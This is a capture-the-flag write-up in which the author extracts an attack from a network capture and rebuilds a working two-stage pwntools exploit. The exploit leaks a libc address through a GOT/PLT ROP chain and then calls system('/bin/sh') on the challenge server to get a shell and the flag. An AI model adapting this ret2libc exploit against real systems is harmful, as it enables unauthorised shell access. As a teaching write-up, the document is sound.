```
Our network was recently breached by some 0-day that we never saw before.
I am providing you with the pcap of the network. Please find out what did they take.

Difficulty estimate: Easy
```

This challenge really intrigued me since it didn't provide us with a binary, so I was really curious about how should one approach this problem.

Since we are provided with a pcap we start by firing up wireshark and analyzing the packets.

Besides ssh and tls traffic there are some interesting tcp packets sending some data. I applied the data as a column in tcp so i can see all the packets sending data, and something amazing showed up. Those packets were actually the exploit being sent over the wire.

I wanted to get all those packets in order to analyze them more in-depth so i opend scapy and filtered the packets that were communicationg on port 4445 since the communication took place on that port.

```python
>>> packets = rdpcap('log2.pcapng')                                                                                                          
>>> pkts = PacketList() 
...: for p in packets: 
...:     if p.haslayer(Raw) and p.haslayer(TCP): 
...:         if p[TCP].sport == 4445 or p[TCP].dport == 4445: 
...:             print(p.load) 
...:                                                                                                                                         
b'AAAAAAAAAAAAAAAAAAAAAAAA'
b'read GOT at 0x404020\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00\n'
b'puts PLT at 0x40102c\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00,\x10@\x00\x00\x00\x00\x00\n'
b'main in binary at 0x4011a3\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00 @@\x00\x00\x00\x00\x00,\x10@\x00\x00\x00\x00\x00\xa3\x11@\x00\x00\x00\x00\x00\n'
b'read found at 0x7f76847cf250\nputs found at 0x7f7684747690\nsystem found at 0x7f768471d390\nfree found at 0x7f768475c4f0\nmalloc found at 0x7f768475c130\n'
b'We should be back at the beginning of binary'
b'POP RDI; RET gadget at 0x40124b\n'
b'AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\x00\x00\x00\x00\x00WM\x86\x84v\x7f\x00\x00\x90\xd3q\x84v\x7f\x00\x00\n'
b"Got shell, let's roll\n"
b'Got flag as evlz{XxXxXxXxXxXxXxXxXxXxXxX}ctf\nClosing connection\n'
```

Hmm, this is interesting. So we know the address of system, let's search for the libc. After a quick search on libc.blukat.me I found it. Now let's get to the exploit. As we can see it's a simple rop chain. We also have the address of a pop rdi gadget. Things are simple now, call puts with the address of read, find the offset of libc in memory then call `system('/bin/sh')`.

Final exploit:

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'
libc = ELF('./libc.so')

host = args.HOST or '35.198.113.131'
port = int(args.PORT or 31336)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

padding = 'A' * 24

pop_rdi  = b'K\x12@\x00\x00\x00\x00\x00'
read_got = b' @@\x00\x00\x00\x00\x00'
puts_plt = b',\x10@\x00\x00\x00\x00\x00'
main     = b'\xa3\x11@\x00\x00\x00\x00\x00'

read_libc   = 0xf7250
system_libc = 0x45390
binsh_libc  = 0x18cd57

io = start()

# Stage 1. Leak

print(io.recv())
io.sendline(padding + pop_rdi + read_got + puts_plt + main)

leaked_read = u64(io.recvline().strip().ljust(8, '\x00'))
offset      = leaked_read - read_libc

log.success('read@libc: ' + hex(leaked_read))
log.success('Offset: ' + hex(offset))

# Stage 2. g3t_5h311

print(io.recv())
io.sendline(padding + pop_rdi + p64(binsh_libc + offset) + p64(system_libc + offset))

io.interactive()

```

Got flag as `evlz{w0ah_A_pwn3r_do3s_netw0rk_for3nsic5}ctf`

This was a really great problem, I loved how this CTF had lots of original problems, had a really great time playing it! Love and peace!

